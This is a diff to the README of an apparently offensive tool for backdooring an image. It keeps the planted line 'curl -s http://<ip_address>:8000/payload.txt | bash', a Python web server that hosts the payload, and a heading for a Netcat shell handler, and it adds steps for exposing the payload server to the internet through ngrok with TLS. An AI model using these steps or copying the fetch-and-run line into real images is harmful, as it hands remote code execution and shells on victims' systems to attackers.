@@ -12,7 +12,7 @@ The line that ends up backdooring the image will be the following:
 
 ```curl -s http://<ip_address>:8000/payload.txt | bash```
 
-For added security use public key pinning:
+For added security use public key pinning (See the section to "Using ngrok for your payload server address"):
 
 ```curl -Iksv --pinnedpubkey sha256//0 https://<your_site>.com```
 
@@ -47,6 +47,12 @@ Next you need to setup the server that will host the file containing your payloa
 ### Starts a server on port 8000 by default
 
 ```python3 -m http.server```
+
+### Using ngrok for your payload server address
+
+```ngrok http 8000 -bind-tls=true```
+
+Starts an ngrok listener and gives you a public address (You will need to follow the "Building the image" section to grab the certificate)
 
 ## Start your Netcat handler
 
